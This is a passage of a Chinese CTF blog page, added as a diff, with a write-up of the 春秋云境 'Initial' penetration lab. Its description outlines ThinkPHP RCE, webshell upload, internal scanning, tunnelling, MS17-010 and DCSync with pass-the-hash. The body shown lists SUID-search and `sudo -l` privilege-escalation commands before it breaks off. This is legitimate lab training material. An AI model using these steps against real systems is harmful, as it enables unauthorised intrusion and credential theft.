@@ -1,0 +1,669 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>春秋云境 - Initial | Jatopos的博客</title><meta name="keywords" content="Web Writeups"><meta name="author" content="Jatopos"><meta name="copyright" content="Jatopos"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="春秋云境 - Initial"><meta name="application-name" content="春秋云境 - Initial"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="春秋云境 - Initial"><meta property="og:url" content="http://example.com/2025/11/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20-%20Initial/index.html"><meta property="og:site_name" content="Jatopos的博客"><meta property="og:description" content="flag1ThinkPHP RCE 与 WebShell 获取看图标可以知道是thinkphp    Thinkphp 漏洞检测工具  上传shell  蚁剑连接  权限提升：SUID 与 sudo 滥用读取 flag1suid提权 find &amp;#x2F; -user root -perm -4000 -pr"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761157280201-a73e9b06-6a6f-4dc8-926d-6fc82d34a978.png"><meta property="article:author" content="Jatopos"><meta property="article:tag" content="Web Crypto"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761157280201-a73e9b06-6a6f-4dc8-926d-6fc82d34a978.png"><meta name="description" content="flag1ThinkPHP RCE 与 WebShell 获取看图标可以知道是thinkphp    Thinkphp 漏洞检测工具  上传shell  蚁剑连接  权限提升：SUID 与 sudo 滥用读取 flag1suid提权 find &amp;#x2F; -user root -perm -4000 -pr"><link rel="shortcut icon" href="/favicon.svg"><link rel="canonical" href="http://example.com/2025/11/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20-%20Initial/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":["🔍 Web","🔢 密码科学与技术本科学生","🎶 Hiphop"]},
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Jatopos","link":"链接: ","source":"来源: Jatopos的博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Jatopos的博客',
+  title: '春秋云境 - Initial',
+  postAI: '',
+  pageFillDescription: 'flag1, ThinkPHP RCE 与 WebShell 获取, 权限提升：SUID 与 sudo 滥用读取 flag1, flag2, 内网横向移动——查网段, 内网扫描：使用 fscan 扫描存活机器, 内网穿透, frp, Neo-reGeorg+Proxifier, 信呼OA qcloudCosAction.php 任意文件上传漏洞, flag3, MS17-010（永恒之蓝）攻陷 Win7 主机, DCSync攻击, 最终flag与获取看图标可以知道是漏洞检测工具上传蚁剑连接权限提升与滥用读取提权列出当前用户被授权可以以执行的命令即查看用户的权限这里有可以利用内网横向移动查网段由于题目提示各部分位于不同的机器上所以这里我们要通过内网横向移动进而获取同一内网中的其他主机或系统里面的内网横向移动是指攻击者在成功入侵一台内网主机后以此为跳板进一步渗透同一内网中的其他主机或系统的过程它是红队渗透测试攻击中的关键阶段目标是扩大控制范围提升权限最终获取核心资产如域控数据库系统等这里首先输入以下指令查一下自身的网段网段是什么一组可以直接通信的地址集合小网段个最常用大网段万个常见于云环境或大型内网举例是一栋楼是一个小区你住在号楼室先敲同楼的门别一上来就跑遍整个小区回显了这里主要看接口主网卡关键信息该主机的内网是子网掩码表示网段是即我们这里查即内网扫描使用扫描存活机器得到网段后我们扫描一下内网中有哪些存活机器我们先用蚁剑上传是什么是一款由中国安全研究员开发的内网综合扫描工具常用于渗透测试和红队行动中主打快速轻量一体化能自动完成多种常见漏洞的探测与利用运行通常指或会对目标网段执行自动化批量扫描主要包括以下功能存活探测端口探测判断主机是否在线端口扫描扫描常见高危端口如等弱口令爆破自动尝试默认弱口令支持共享部分版本等漏洞检测自动检测常见漏洞例如永恒之蓝未授权访问反序列化目录遍历如你之前提到的等信息收集获取网站标题中间件版本等代理支持部分版本支持通过代理扫描使用进行扫描并将结果返回得到跳转信呼协同办公系统已完成扫描结束耗时可以获得以下信息域控信呼系统存在永恒之蓝内网穿透这里我们先打信呼这个漏洞信呼任意文件上传漏洞信呼全称信呼协同办公系统是一款由国内开发者信呼团队开发的开源免费企业协同办公平台主要面向中小型企业提供流程审批文档管理任务协作人事管理等功能这里需要内网穿透使得我们在攻击机系统中也能访问内网首先尝试内网穿透目的是使我们能够在攻击机访问内网的服务我们需要将和上传到我们的将和上传到我们的靶机服务端的公网控制端口默认开始定义一个代理配置代理名称需唯一代理类型为内网目标服务的内网目标服务的端口在上映射的公网端口然后在靶机执行在执行但是这里蚁剑网络不是很好没有成功我们换一个方法这里学习了一下使用实现内网穿透生成密钥自动生成脚本文件将对应脚本文件上传的目录的应用目录并确定可以访问这里将上传至蚁剑发现可以正常访问使用连接目标脚本文件指定端口默认为已经设定的密钥确定脚本正常工作接下来配合实现流量转发此时可以正常穿透信呼任意文件上传漏洞爆破得到账号密码成功进入系统这里直接打信呼这个漏洞有一个为需要修改以下内容同目录下需要放一个一句话木马木马上传成功访问一下网页发现可以正常解析蚁剑连接注意这里一定要先改一下代理设置否则会连不上一句话木马连接成功由于目录比较多我们可以先查找匹配一下直接访问就可以拿到第二个永恒之蓝攻陷主机在中我们对内网进行扫描扫出来了永恒之蓝存在永恒之蓝首先了解一下什么是永恒之蓝永恒之蓝是由美国国家安全局开发的一个高危漏洞利用工具后被黑客组织在年月公开泄露它利用的是操作系统中协议的一个远程代码执行漏洞编号漏洞位置协议的内核驱动中漏洞类型缓冲区溢出具体是由于协议在处理恶意构造的写入请求时未正确验证数据长度导致攻击者可以向内核内存中写入任意数据攻击者只需目标开放端口服务即可远程执行任意代码成功利用后可获得权限最高权限要成功利用目标必须同时满足以下条件未安装补丁微软在年月发布修复补丁如若已打补丁则无法利用启用协议默认在中禁用但默认开启端口开放且可访问攻击者必须能通过端口与目标通信无防火墙拦截目标为支持架构主要影响最稳定部分也可利用需不同接下来我们要利用永恒之蓝进行攻击这里需要用到渗透框架自带这个框架接着我们先了解一下是的缩写它是一个开源的渗透测试平台广泛用于开发测试和执行漏洞利用代码以评估目标系统的安全性漏洞利用执行远程本地如由于我们要用到所以这里还是先用对实现内网穿透然后我们需要设置代理这里需要用到工具启动是一个工具用于强制让后续程序的网络流量通过预配置的代理链如或代理是的交互式命令行界面搜索相关模块一共有四个相关模块这里我们选择使用第一个模块因为它支持的版本较多然后接下来依次输入以下命令来发起永恒之蓝攻击选择使用的模块设置可以通过查看设置靶机的执行攻击运行成功会出现是中载荷成功执行后进入的交互式命令行提示符扩展模块它表示你已经获得了一个与目标系统建立的高级内存驻留型后渗透会话对目标系统进行更深入的渗透连接成功后我们查看一下我们的权限已经是权限了攻击这里我们就已经打入目标主机了但是该子机上并没有我们最后的在域控制器上面域控域控是什么域控制器是活动目录网络架构中的核心服务器角色负责集中管理网络中的用户计算机组策略身份验证和授权等安全服务在或红队演练中拿到拿到域内所有用户凭证敏感数据后门均可获取如何拿到呢这里需要进行攻击在中多个域控制器之间需要保持数据一致比如用户密码修改后所有都要同步更新为此提供了一套名为的协议允许之间通过调用如请求同步目录数据每隔就会进行一次域数据同步攻击就是伪装成一台合法的域控制器向目标发起复制请求要求同步特定用户的凭证信息由于信任具备复制权限的主体目标会主动返回该用户的密码哈希和密钥我们可以通过来导出所有用户的然后进行哈希传递攻击如果想要执行必须拥有以下任一高权限身份域管理员企业管理员组成员在域控制器本地被显式授予权限的账户可通过滥用实现在我们一开始的中说明我们拿下的这台机子是用户可以进行攻击接下来我们来获取用户的加载扩展模块支持内存凭证提取哈希转储票据操作等高级功能通过调用的功能导出域内所有用户的凭证信息包括哈希值并以格式输出结果如下我们可以看到用户的接下来我们使用来进行哈希传递攻击来实现域控上的任意命令执行简称是一个专为渗透测试和红队行动设计的后渗透利用框架主要用于大规模自动化地枚举攻击和利用网络中的等服务这道题我们使用哈希进行横向移动直接利用哈希值完成身份认证从而在其他主机上执行命令或获取访问权限的认证协议在验证用户身份时并不强制要求明文密码而是使用即密码的哈希进行挑战响应计算拿到最终',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-11-03 23:22:39',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 8.0.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://q1.qlogo.cn/g?b=qq&amp;nk=3636469976&amp;s=640" referrerpolicy="no-referrer"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Jatopos的博客</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=4940080934&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" referrerpolicy="no-referrer"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" referrerpolicy="no-referrer"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/SSTI/" style="font-size: 1.05rem;">SSTI<sup>1</sup></a><a href="/tags/Web-Notes/" style="font-size: 1.05rem;">Web Notes<sup>3</sup></a><a href="/tags/Web-Writeups/" style="font-size: 1.05rem;">Web Writeups<sup>6</sup></a><a href="/tags/php/" style="font-size: 1.05rem;">php<sup>1</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 1.05rem;">文件上传<sup>1</sup></a><a href="/tags/%E8%BD%AC%E4%B8%93%E4%B8%9A/" style="font-size: 1.05rem;">转专业<sup>1</sup></a><a href="/tags/%E9%A3%8E%E6%99%AF/" style="font-size: 1.05rem;">风景<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/11/"><span class="card-archive-list-date">十一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/10/"><span class="card-archive-list-date">十月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/09/"><span class="card-archive-list-date">九月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/Web-Writeups/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Web Writeups</span></a></span></div></div><h1 class="post-title" itemprop="name headline">春秋云境 - Initial</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-11-03T15:21:32.000Z" title="发表于 2025-11-03 23:21:32">2025-11-03</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-11-03T15:22:39.878Z" title="更新于 2025-11-03 23:22:39">2025-11-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="春秋云境 - Initial"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为海口"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>海口</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761157280201-a73e9b06-6a6f-4dc8-926d-6fc82d34a978.png" referrerpolicy="no-referrer"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2025/11/03/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%20-%20Initial/"><header><a class="post-meta-categories" href="/categories/CTF/" itemprop="url">CTF</a><a href="/tags/Web-Writeups/" tabindex="-1" itemprop="url">Web Writeups</a><h1 id="CrawlerTitle" itemprop="name headline">春秋云境 - Initial</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Jatopos</span><time itemprop="dateCreated datePublished" datetime="2025-11-03T15:21:32.000Z" title="发表于 2025-11-03 23:21:32">2025-11-03</time><time itemprop="dateCreated datePublished" datetime="2025-11-03T15:22:39.878Z" title="更新于 2025-11-03 23:22:39">2025-11-03</time></header><h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><h2 id="ThinkPHP-RCE-与-WebShell-获取"><a href="#ThinkPHP-RCE-与-WebShell-获取" class="headerlink" title="ThinkPHP RCE 与 WebShell 获取"></a>ThinkPHP RCE 与 WebShell 获取</h2><p>看图标可以知道是thinkphp  </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1761158167348-1c630d8e-5092-4c73-bebf-1d9bcb95f355.png" referrerpolicy="no-referrer"></p>
+<p>Thinkphp 漏洞检测工具</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760090476791-419a57dd-4679-44e5-afc2-0a454b0614ed.png" referrerpolicy="no-referrer"></p>
+<p>上传shell</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760371032114-d7c766d1-432f-40aa-8c1d-75081a43d73d.png" referrerpolicy="no-referrer"></p>
+<p>蚁剑连接</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760371038941-3147ba76-a680-46ff-a915-48c38968cf93.png" referrerpolicy="no-referrer"></p>
+<h2 id="权限提升：SUID-与-sudo-滥用读取-flag1"><a href="#权限提升：SUID-与-sudo-滥用读取-flag1" class="headerlink" title="权限提升：SUID 与 sudo 滥用读取 flag1"></a>权限提升：SUID 与 sudo 滥用读取 flag1</h2><p>suid提权</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -<span class="number">4000</span> -<span class="built_in">print</span> <span class="number">2</span>&gt; result.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760089669935-83f0d6f5-7e80-4925-8d86-54e15838c101.png" referrerpolicy="no-referrer"></p>
+<p><strong>列出当前用户被授权可以以 sudo 执行的命令</strong>（即查看用户的 sudo 权限）。  </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760089624691-336742d3-dd6f-4247-9f62-872d7db3f2c0.png" referrerpolicy="no-referrer"></p>
+<p>这里有mysql可以利用</p>
